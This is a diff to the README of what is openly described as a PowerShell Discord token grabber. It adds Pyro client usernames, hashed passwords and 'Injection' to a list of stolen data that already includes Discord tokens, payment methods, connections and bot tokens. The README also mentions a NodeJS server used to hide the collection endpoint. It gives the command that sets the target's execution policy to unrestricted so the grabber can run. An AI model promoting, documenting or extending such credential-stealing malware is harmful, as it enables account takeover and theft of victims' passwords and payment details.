@@ -15,6 +15,8 @@ This Powerful Discord Token grabber made in powershell grabs the following infor
 >Future alts and waypoints<br>
 >Remix UID<br>
 >Remix alts<br>
+>Pyro client username<br>
+>Pyro hashed password<br>
 
 The target must have his execution policy set to unrestricted<br>
 `Set-ExecutionPolicy -Scope Localmachine -ExecutionPolicy Unrestricted`
@@ -52,3 +54,4 @@ Here is a list of steps to follow to setup this simple NodeJS server to hide the
 >Payment Methods(full list in separated embeds)<br>
 >Connections(full list in separated embeds)<br>
 >Applications(Only Bot ID, Client Key, Public Key and Bot Tokens)<br>
+>Injection<br>
